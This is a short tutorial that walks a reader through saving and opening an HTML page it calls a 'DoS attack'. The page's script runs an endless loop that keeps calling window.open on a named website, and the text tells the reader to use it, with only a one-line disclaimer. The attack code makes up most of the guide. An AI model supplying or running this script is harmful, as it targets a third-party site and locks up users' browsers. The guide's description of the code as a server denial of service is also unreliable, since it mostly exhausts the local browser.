# Step-by-Step Guide: Using the DoS Attack HTML Code

**Disclaimer**: This guide is for educational purposes only. Unauthorized and malicious use of Denial of Service (DoS) attacks is illegal and unethical.

This guide explains how to use the provided HTML code to simulate a Denial of Service (DoS) attack. A DoS attack aims to overwhelm a target server or website, rendering it unavailable to legitimate users.

## Prerequisites
A web browser with JavaScript support (e.g., Chrome, Firefox, Safari)

## Steps

1. Access the HTML Code:

    Open a text editor or integrated development environment (IDE) to access the HTML code. You can also create a new HTML file using a simple text editor.

2. Copy the code:

   ```html
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>DoS Attack</title>

        <script>
            function dos(){
                window.open("https://www.urkdash.com/", "dos", "width=1000, height=1000", "_blank");
            }

            for(;;){
                dos();
            }
        </script>
    </head>
    <body>
    </body>
    </html>
   ```
3. Save the File:

    Save the file with a .html extension, such as dos_attack.html.

4. Open the HTML File:

    Double-click the saved HTML file to open it in a web browser. Alternatively, you can right-click the file and choose "Open with" to select a browser.

5. Observe the Effect:

    As the HTML file is opened in the browser, it will start executing the JavaScript code inside the `<script>` tag. This code will continuously open new browser windows targeting the URL `https://www.urkdash.com/`. This is a simulated DoS attack, which will consume system resources and potentially render the browser unresponsive.

6. Close the Browser Tabs:

    To stop the simulated attack, close the browser tabs that were opened by the script. You may need to forcefully close the browser if it becomes unresponsive.
